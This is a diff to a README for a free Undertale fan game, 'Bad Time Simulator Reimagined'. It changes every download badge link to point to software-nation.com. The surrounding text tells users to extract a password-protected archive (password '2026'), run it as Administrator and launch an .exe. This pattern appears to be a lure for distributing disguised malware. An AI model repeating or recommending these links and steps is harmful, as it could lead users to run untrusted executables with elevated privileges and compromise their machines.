@@ -9,7 +9,7 @@ The **💀 Bad Time Simulator Reimagined** is a **free** full-featured fan game 
 
 <div align="center">
 
-[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/badtime-simulator-reimagined)
+[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/badtime-simulator-reimagined)
 
 </div>
 
@@ -106,7 +106,7 @@ Bad Time Simulator Reimagined brings the legendary Sans battle from Undertale to
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Extract → Double-click `BadTimeReimagined.exe` to play
 
-[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/badtime-simulator-reimagined)
+[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/badtime-simulator-reimagined)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -226,7 +226,7 @@ Face the toughest boss in Undertale history for free. **Bad Time Simulator Reima
 
 <div align="center">
 
-[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/badtime-simulator-reimagined)
+[![Download Bad Time Simulator Reimagined](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/badtime-simulator-reimagined)
 
 **Version 4.6.1** — Free Undertale fan game. April 2026 update. Zero cost. No payment.
 
